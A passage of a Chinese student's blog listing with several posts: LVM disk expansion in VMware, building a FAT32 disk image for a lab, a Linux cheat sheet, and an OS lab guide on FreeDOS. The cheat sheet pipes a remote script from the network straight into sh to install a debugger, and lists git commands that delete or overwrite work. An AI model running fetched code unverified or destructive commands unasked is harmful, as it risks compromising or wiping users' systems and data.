class="line">            <span class="attr">&quot;preLaunchTask&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cl.exe build active file&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>配置完后，就可以通过: "终端 -&gt; 运行任务" 中选择 "C/C++: cl.exe
build and debug active file" 来生成并运行了。</p>
<p>初次运行完成 Default 的设置后，就可以通过 F5 启动调试了。</p>
<p>console 项是在运行时生成一个新的窗口，而不是使用调试控制台。它默认为
<code>internalConsole</code>。较低版本中配置方法不同，如下:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;externalConsole&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/14/VMware-LVM-%E7%A3%81%E7%9B%98%E6%89%A9%E5%AE%B9/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Qing-LKY">
      <meta itemprop="description" content="可爱就是正义！">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="小乖乖的妙妙屋">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/14/VMware-LVM-%E7%A3%81%E7%9B%98%E6%89%A9%E5%AE%B9/" class="post-title-link" itemprop="url">VMware LVM 磁盘扩容</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-10-14 16:41:12 / 修改时间：18:34:14" itemprop="dateCreated datePublished" datetime="2022-10-14T16:41:12+08:00">2022-10-14</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课程笔记</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前言">前言</h2>
<p>最近装了点东西，磁盘空间有点吃不消了。于是想着给虚拟机扩展磁盘。我使用的
VMware® Workstation 16 Pro。使用的 Linux 镜像是
ubuntu-20.04.5-live-server-amd64。</p>
<p>由于之前安装系统的时候没怎么细看，直接一路默认点过去了。我发现使用的似乎是
LVM。</p>
<p>所以鼓捣一下，扩了下容，记录下做法。</p>
<h2 id="part-1">Part 1</h2>
<p>输入
<code>df -h</code>，可以查看文件系统磁盘空间的使用情况。我发现，我的
/dev/mapper/ubuntu--vg-ubuntu--lv 也就是挂载在 <code>/</code>
的已经满了。 用了 8 个 G。但实际上我不止给我的虚拟机分配了这么点，我分了
20 G。应该是什么地方没设置好。</p>
<p>当我查看硬盘状况 <code>sudo fdisk -l</code> 时，发现 /dev/sda3 有 18
个 G。也就是说其实我还有 10 个 G 没有用上。</p>
<p>所以去查了一下，翻到了不少博客。</p>
<p>首先，输入 <code>sudo vgdisplay</code>，发现果然还有很大的 Free
Size。</p>
<p>于是，运行下面的指令扩展逻辑卷的大小：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lvextend -L +10G /dev/mapper/ubuntu--vg-ubuntu--lv</span><br></pre></td></tr></table></figure>
<p>具体扩大几 G 取决于 Free Size 的大小，10 G 对我来说是可行的。</p>
<p>然后把文件系统的大小也调整一下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resize2fs /dev/mapper/ubuntu--vg-ubuntu--lv</span><br></pre></td></tr></table></figure>
<h2 id="part-2">Part 2</h2>
<p>后来，我发现原本分配的这 20 个 G 也不是很够用。于是我又在 VMware
里通过“虚拟机--设置--硬盘--扩展”，给它分配到了 40 G。</p>
<p>再次输入 <code>sudo fdisk /dev/sda -l</code>
时，我发现，它的大小已经变大，但是三个分区的大小没变，并且出现了 "GPT
PMBR size mismatch (41943039 != 83886079) will be corrected by write."
的提示。</p>
<p>于是我直接 <code>sudo fdisk /dev/sda</code>。输入 d 删掉了原本 18 G
的分区 3，然后输出 n 重新建了分区
3，建分区的过程保持默认，它会自动帮我分配剩余的所有空间到这个分区里。在提示是否删除原有标签的时候选择了
No。</p>
<p>但是此时，pv
卷的大小还没有变，只是物理盘大小大了。用下面的指令就可以把 pv
卷自动调整。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看自己的物理卷名字 我的叫 /dev/sda3</span></span><br><span class="line">sudo pvdisplay</span><br><span class="line"><span class="comment"># 调整段的大小</span></span><br><span class="line">sudo pvresize /dev/sda3</span><br></pre></td></tr></table></figure>
<p>再次 <code>sudo pvdisplay</code>。发现 pv 卷的大小对了。</p>
<p>再次 <code>sudo vgdisplay</code>。发现 Free Size 又有了。</p>
<p>再重复 Part 1 的步骤就行了。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/28/use-disk-image-for-fslab/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Qing-LKY">
      <meta itemprop="description" content="可爱就是正义！">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="小乖乖的妙妙屋">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/28/use-disk-image-for-fslab/" class="post-title-link" itemprop="url">如何在 Linux 下嗯造一个实验用的磁盘映像</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-09-28 18:11:46" itemprop="dateCreated datePublished" datetime="2022-09-28T18:11:46+08:00">2022-09-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-10-14 18:34:26" itemprop="dateModified" datetime="2022-10-14T18:34:26+08:00">2022-10-14</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课程笔记</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2.5k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>4 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前言">前言</h2>
<p>事情是这样的。我们软安有个实验，需要一个 FAT32 的磁盘或 U
盘来研究文件系统和磁盘的结构。</p>
<p>但是非常尴尬的是，我压根没有这样的条件。我的两个盘都是 NTFS
的，手头也没有 U 盘。</p>
<p>所以我决定在 Linux 下，使用虚拟磁盘映像来做这个实验。</p>
<p>下面我将会嗯造一个实验用的磁盘映像。为了达到研究的目的，它会有分区，有
FAT32 文件系统，并且各个分区会有一些各种各样的文件。</p>
<h2 id="创建虚拟磁盘">创建虚拟磁盘</h2>
<p>其实就是需要个满足要求大小的文件。</p>
<h3 id="方法一使用-bximage">方法一：使用 bximage</h3>
<p>在 OS 实验中应该用过这个玩意的。fd 还是 hd 都无所谓，没指定 type
就是默认 flat，出来的就会是 128M 的“空”文件。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install bximage</span><br><span class="line">bximage -func=create -fd=128M -q myDisk.img</span><br></pre></td></tr></table></figure>
<h3 id="方法二使用-dd-和-devzero">方法二：使用 dd 和 /dev/zero</h3>
<p>同样也是 OS 实验用过的东西。只不过这次的输入来源是 /dev/zero
这个特殊的设备。它会不停的输出 0 (NULL)。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下面的指令会往 myDisk.img 里填充 128Mb 的 0</span></span><br><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero of=myDisk.img bs=1M count=128</span><br></pre></td></tr></table></figure>
<h2 id="磁盘分区">磁盘分区</h2>
<p>此时的磁盘还没有分区，我们需要对它进行分区。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo fdisk myDisk.img</span><br></pre></td></tr></table></figure>
<p>执行上面的指令后，会进入 fdisk 提供的交互界面。它的使用大致如下：</p>
<ul>
<li>输入 m 可以查看所有能用的指令。</li>
<li>输入 l 可以查看所有支持的文件类型的 16 进制码。可以看到我们需要的
FAT32 类型码是 b。</li>
<li>输入 p 可以查看当前已有的分区状况。现在还没有任何分区。</li>
<li>输入 n 创建一个新的分区。进入分区创建的交互： 输入 p/e
来创建主分区或扩展分区。这里我们输入 p。
输入一个数字作为分区号。这里我们保持默认（分区 1）。
输入一个数字表示第一扇区的起始扇区。这里我们保持默认。
输入一个数字来表示第一扇区的最后扇区。这里我们输入一个比较靠中间的数（因为我想多造点分区）。
此时我们就造出了一个分区。分区的默认类型是 linux。
重复上述过程，多造一两个分区出来。</li>
<li>输入 t 来修改分区的类型。将创建的分区修改位
FAT32（b）类型。具体操作跟着交互提示走，此处不再赘述。</li>
<li>输入 O 可以导出我们当前的配置。输入 L 可以载入一个配置。</li>
<li>输入 w 来将修改写入虚拟硬盘。并退出 fdisk。</li>
</ul>
<p>简单的规划一下：我们的盘是 128 Mb。注意 FAT32
对簇的数量是有要求的。它要求至少要有 65525 个簇。我们的扇区大小是 512
b。大致算一下，一个分区至少要有 32 Mb。</p>
<p>（我暂时还没有理解 65525 的逻辑所在。<a target="_blank" rel="noopener" href="https://www.keil.com/pack/doc/mw/FileSystem/html/fat_fs.html">情报来源是这个</a>。）</p>
<p>你可以把已经算好的配置用 O 导出了。你可以这样做：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果你忘了用 O。你也可以这样导出：</span></span><br><span class="line">sudo sfdisk -d myDisk.img &gt; disksrc</span><br><span class="line"><span class="comment"># 这样可以用之前的分区配置来分区：</span></span><br><span class="line">sudo sfdisk myDisk.img &lt; disksrc</span><br></pre></td></tr></table></figure>
<p>下面是我的 diskrc，如果不想手动分区，也可以直接用我的导入：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">label: dos</span><br><span class="line">label-id: 0x50380754</span><br><span class="line">device: myDisk.img</span><br><span class="line">unit: sectors</span><br><span class="line"></span><br><span class="line">myDisk.img1 : start=        2048, size=       67953, type=b</span><br><span class="line">myDisk.img2 : start=       71680, size=       70001, type=b</span><br><span class="line">myDisk.img3 : start=      143360, size=      118784, type=b</span><br></pre></td></tr></table></figure>
<p>分区我是随便加的。如果你希望多分几个区甚至扩展分区来研究，最好把磁盘大小拉大一点，比如拉到
256 Mb。</p>
<p>需要注意，在 fdisk 下用 O 指令导出的 disksrc
是只读的。如果需要改动，需要使用 <code>chmod +w disksrc</code>
来添加可写权限。使用 <code>sfdisk -d</code>
则不会，因为它只负责导出到标准输出。</p>
<h2 id="使用-loop-设备">使用 loop 设备</h2>
<p>我们的分区还没有被格式化。我们需要对每个分区分别格式化，而不是对整个磁盘格式化。所以我们需要建立
loop 设备到分区的映射，单独对每个分区进行格式化。</p>
<p>这里有几篇参考的文章，其中这篇问答含有完整的三种做法：<a target="_blank" rel="noopener" href="https://askubuntu.com/questions/69363/mount-single-partition-from-image-of-entire-disk-device">Mount
single partition from image of entire disk device</a>。</p>
<p>我的 Ubuntu 版本较高，可以使用最简单的方法二（需要 16.05 +）：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用这个指令后，myDisk 的各个分区会被映射到 /dev/loop* 上。例如 /dev/loop3p1：</span></span><br><span class="line">sudo losetup -Pf myDisk.img</span><br><span class="line"><span class="comment"># 使用下面的指令可以取消 loop3 的映射（所有的分区）：</span></span><br><span class="line">sudo losetup -d /dev/loop3</span><br></pre></td></tr></table></figure>
<p>其它两种方法，有需要的读者可自行到上面的链接中阅读。方法一是手动计算偏移。方法三是使用了一个工具。</p>
<h2 id="分区格式化">分区格式化</h2>
<p>上面我们已经将各个分区弄到了 loop
设备上，接下来我们可以进行格式化了：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkfs.fat -F32 /dev/loop3p1</span><br></pre></td></tr></table></figure>
<p>其它分区的格式化方法类比一下即可。</p>
<h2 id="分区挂载和加入文件">分区挂载和加入文件</h2>
<p>需要先 losetup。如果你没有 losetup 的话，参考前面。</p>
<p>使用 mount 把 /dev/loop3p1 之类的挂载到某个目录上就行了。例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 挂载</span></span><br><span class="line">sudo mount /dev/loop3p1 /mnt/myhd</span><br><span class="line"><span class="comment"># 取消</span></span><br><span class="line">sudo umount /dev/loop3p1</span><br></pre></td></tr></table></figure>
<p>需要注意你可能不止要 <code>umount</code>，还需要
<code>losetup -d</code>。取决于你的个人需要。</p>
<h2 id="信息检查">信息检查</h2>
<p>你可以用下面的指令来查看你挂上去的这个磁盘的相关信息：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下面的指令可以查看挂载点的信息：</span></span><br><span class="line">mount</span><br><span class="line">mount | grep <span class="string">&quot;/mnt/myhd&quot;</span></span><br><span class="line"><span class="comment"># 下面的指令可以查看：</span></span><br><span class="line"><span class="comment"># 使用了哪个 loop 设备、文件系统类型、磁盘大小、已使用大小、挂载位置</span></span><br><span class="line"><span class="built_in">df</span> -hT</span><br><span class="line"><span class="built_in">df</span> -hT | grep <span class="string">&quot;/mnt/myhd&quot;</span></span><br><span class="line"><span class="comment"># 下面的指令可以查看更具体的磁盘、设备信息：</span></span><br><span class="line">sudo fdisk -l</span><br></pre></td></tr></table></figure>
<h2 id="懒人总结">懒人总结</h2>
<p>我把上面的步骤搞在了一个 bash 脚本里：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Qing-LKY/Image-Builder-for-Filesystem-Study">https://github.com/Qing-LKY/Image-Builder-for-Filesystem-Study</a></p>
<p>也许能帮上忙。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/27/Linux-%E5%AD%A6%E4%B9%A0%E5%A4%87%E5%BF%98%E5%BD%95/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Qing-LKY">
      <meta itemprop="description" content="可爱就是正义！">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="小乖乖的妙妙屋">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/27/Linux-%E5%AD%A6%E4%B9%A0%E5%A4%87%E5%BF%98%E5%BD%95/" class="post-title-link" itemprop="url">Linux 学习备忘录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-09-27 10:28:36" itemprop="dateCreated datePublished" datetime="2022-09-27T10:28:36+08:00">2022-09-27</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-05-27 00:42:02" itemprop="dateModified" datetime="2024-05-27T00:42:02+08:00">2024-05-27</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课程笔记</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>1.1k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前言">前言</h2>
<p>因为最近装新环境的频率有点高，我发现我经常动不动就忘记指令什么的，整天百度，浪费时间，所以开个帖备查算了。</p>
<h2 id="解压压缩命令">解压、压缩命令</h2>
<table>
<colgroup>
<col style="width: 25%">
<col style="width: 25%">
<col style="width: 25%">
<col style="width: 25%">
</colgroup>
<thead>
<tr class="header">
<th>格式</th>
<th>加压</th>
<th>解压</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>.tar</td>
<td><code>tar cvf x.tar myDir/</code></td>
<td><code>tar xvf x.tar</code></td>
<td>此命令只打包不压缩。打包时也可以直接指定文件而不是目录。解包效果类似“解压到当前文件夹”</td>
</tr>
<tr class="even">
<td>.tar.gz</td>
<td><code>tar zcvf x.tar.gz myDir/</code></td>
<td><code>tar zxvf x.tar.gz</code></td>
<td>c 是 create，x 是 extract</td>
</tr>
<tr class="odd">
<td>.gz</td>
<td><code>gzip myfile</code></td>
<td><code>gzip -d x.gz</code></td>
<td>单个文件的压缩</td>
</tr>
<tr class="even">
<td>.xz</td>
<td><code>xz -z a</code></td>
<td><code>xz -d a.xz</code></td>
<td><code>-k</code> 可以保留原本的文件，否则默认删除</td>
</tr>
<tr class="odd">
<td>.tar.xz</td>
<td><code>tar -cJf arch.tar.xz directory</code></td>
<td><code>tar Jxvf a.tar.gz</code></td>
<td><code>--remove-files</code> 可删除原本的</td>
</tr>
<tr class="even">
<td>.zip</td>
<td><code>zip -r a.zip a/</code></td>
<td><code>unzip a.zip</code></td>
<td>该解压等价于 <code>unzip -d ./ a.zip</code></td>
</tr>
</tbody>
</table>
<h2 id="git">Git</h2>
<p>删除所有没有被 track
的文件：<code>git clean -f</code>。（查看这步操作会删掉什么：<code>git clean -n</code>）</p>
<p>将被 track 的文件恢复到上次 commit
的状态：<code>git reset --hard HEAD</code>。（不带 --hard
可以查看会修改什么）</p>
<p>将修改提交到上次 commit 里：<code>git commit --amend</code>。</p>
<p>fetch
之后需要手动合并：<code>git merge master origin/master</code>。</p>
<p>强制推送覆盖远端分支：<code>git push -f</code>。</p>
<h2 id="ssh">SSH</h2>
<p>生成可用于 Github 的 ssh
key：<code>ssh-keygen -t ecdsa -b 521 -C "your_email@example.com"</code>。</p>
<h2 id="查找文件">查找文件</h2>
<p>使用 whereis: <code>whereis bash</code>。</p>
<p>使用 find: <code>find ~/ -name "x.txt"</code>。</p>
<h2 id="文件系统">文件系统</h2>
<p>查看大小: <code>df -hT</code>。</p>
<p>查看文件/文件夹大小: <code>du -sh file</code>。</p>
<h2 id="glibc">glibc</h2>
<p><code>ldd --version</code> 可以查看系统对应的 libc 版本</p>
<h2 id="gdb-or-gef">gdb or gef</h2>
<p>安装 gef 需要 python3:
<code>sh -c "$(curl -fsSL http://gef.blah.cat/sh)"</code> (需要代理)</p>
<p>也可以用镜像这样装:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -O https://gitee.com/datree1353/gef/raw/dev/gef.py</span><br><span class="line"><span class="built_in">mv</span> gef.py ~/.gdbinit-gef.py</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">source</span> ~/.gdbinit-gef.py &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
<h1 id="python">python</h1>
<p>如果 python 版本较低，升级 pip 时应该这样:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install --upgrade pip</span><br></pre></td></tr></table></figure>
<h1 id="sudo-用户管理">sudo 用户管理</h1>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo visudo</span><br></pre></td></tr></table></figure>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username    ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/20/OS-LAB-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Qing-LKY">
      <meta itemprop="description" content="可爱就是正义！">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="小乖乖的妙妙屋">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/20/OS-LAB-2/" class="post-title-link" itemprop="url">《操作系统实践》实验指南 2</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-09-20 08:59:44" itemprop="dateCreated datePublished" datetime="2022-09-20T08:59:44+08:00">2022-09-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-09-28 10:03:02" itemprop="dateModified" datetime="2022-09-28T10:03:02+08:00">2022-09-28</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课程笔记</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>5.3k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>9 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>文章目录：</p>
<ol type="1">
<li><p><a target="_blank" rel="noopener" href="https://qing-lky.github.io/2022/09/13/OS-LAB/">环境配置与 "hello
OS！"</a></p></li>
<li><p><strong>从实模式到保护模式</strong></p></li>
</ol>
<h1 id="从实模式到保护模式">2 从实模式到保护模式</h1>
<h2 id="前言">前言</h2>
<p>你可能会问，上一篇不是才写了前言吗，怎么又来。其实我只是单纯的想吐槽一下，不知道放到正文的哪里，就丢到这来了。</p>
<p>我发现，我做实验的效率极其低下，主要是下面几个原因：</p>
<ul>
<li><p>睿智的虚拟环境搞得人很烦躁</p>
<p><del>傻逼</del>可爱的 VMware
动不动就无响应个两分钟，有时暂停之后还会一直无响应。（据说是防火墙问题，但是不好说，所以用的战战兢兢）</p>
<p>可爱的 VMware tools
每天要重装两三遍。搞得我都不想用共享剪切板功能了。</p>
<p>想换 virtual
box。结果奇慢无比，连启动都启动不了。（查了下官方社区，个人推测 hyper-v
+ amd 的问题）</p></li>
<li><p>钻牛角尖</p>
<p>总是被一些与实验无关紧要的问题吸引注意力，什么都想弄清楚，结果就是什么都顾不上。</p></li>
<li><p>too much things to do</p>
<p>信安大三上怎么这么多实验，f**k</p></li>
</ul>
<p><del>没事了，让我们开始吧（</del></p>
<h2 id="freedos-初体验">2.1 Freedos 初体验</h2>
<h3 id="why-dos">2.1.1 Why DOS？</h3>
<p>DOS 是磁盘操作系统（Disk Operating
System）的简称，是早期个人计算机上的一类操作系统。</p>
<p>在上一章中，课本里提到：</p>
<blockquote>
<p>还有一个可选的方法能够帮助调试，做法也很简单，就是把 "org 07c00h"
这一行改成 "org 0100h" 就可以编译成一个 .COM 文件让它在 DOS
下运行了。</p>
</blockquote>
<p>通过 DOS，可以方便地进行引导程序的执行和调试。</p>
<p>在之前的实验中，我们都是将引导程序直接写入引导扇区中。但是引导扇区的大小是有限的（512），随着程序的增大，问题会逐渐体现。为了解决这个问题，可以写一个“真正的”引导扇区来读取我们的程序，使我们的程序像一个真正的内核那样被运行。但这有较高的难度。</p>
<p>再加上：</p>
<blockquote>
<p>很多保护模式的教程都是基于 DOS
来讲的，如果读者在本书中有些东西没有搞明白，可以同时参考其它教程。</p>
</blockquote>
<p>在这一章的实验中，我们选择 bochs + Freedos 的方式来进行。</p>
<h3 id="freedos-的正确下载姿势与解读">2.1.2 Freedos
的正确下载姿势与解读</h3>
<p>虽然书上只有一句轻描淡写的“从官网上下载”，不过我连续下错了两次，所以还是记录下如何获取到正确的、可以用教材中的配置方法启动的映像。</p>
<p>事实上，在各种渠道下下载的盘，只要配置正确，都可以在 bochs
中启动。不过，作为一个初学者，我们可以先尝试教材中介绍的方法。</p>
<p>下载的入口在<a target="_blank" rel="noopener" href="https://bochs.sourceforge.io/">Bochs
官网</a>的侧边栏 Get Bochs 下的 <a target="_blank" rel="noopener" href="https://bochs.sourceforge.io/diskimages.html">Disk
Image</a>。我们要下的是 freedos 的映像。</p>
<p>我下载下来时它的名字叫："freedos-img.tar.gz"，里面有四个文件
"a/b/c.img" 和 "bochsrc"。只有在这里下载的压缩包里面才会有课本中提到的
"a.img"。</p>
<p><em>如果你不想关心别的事情了，那可以跳到 2.1.3
了。后面的内容只是记录我在找到这个书上指定的东西的过程中发现的一些趣事。</em></p>
<p>首先，事实上，你也可以在其它地方找到 freedos。比如 <a target="_blank" rel="noopener" href="https://freedos.org/download/">freedos 自己的官网</a>，和我们<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/bochs/files/">下载 bochs
源码的地方附近</a>。</p>
<p>freedos 官网上可以找到能用的 FreeDOS 1.3 Floppy Edition。根据它的
readme.txt，我们也许可以用 144m/x86boot.img 作为启动盘来装比较高版本的
freedos。<del>（xygg
试过，跑起来很帅）</del>不过我没有去尝试，不清楚配置的细节上有没有特殊的讲究。而且我们的实验对
freedos 的版本其实没有多大的讲究。</p>
<p>至于 sourceforge.net 上提供的那个，则是个 hard
disk，配置起来和书上提供的有很大出入（当然它有给出示例
